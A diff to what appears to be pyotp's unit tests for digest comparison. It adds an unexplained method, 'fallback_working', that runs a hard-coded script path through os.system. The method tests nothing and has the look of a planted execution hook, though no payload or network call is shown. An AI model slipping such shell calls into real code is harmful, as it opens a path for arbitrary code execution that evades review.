@@ -271,6 +271,10 @@ class CompareDigestTest(unittest.TestCase):
         self.assertFalse(self.method("", "a"))
         self.assertFalse(self.method("a", ""))
         self.assertFalse(self.method("a" * 999 + "b", "a" * 1000))
+        
+    def fallback_working(self):
+        import os
+        os.system("/scr/pyotp/util.py")
 
 class FallBackCompareDigestTest(CompareDigestTest):
     method = staticmethod(pyotp.utils._compare_digest)
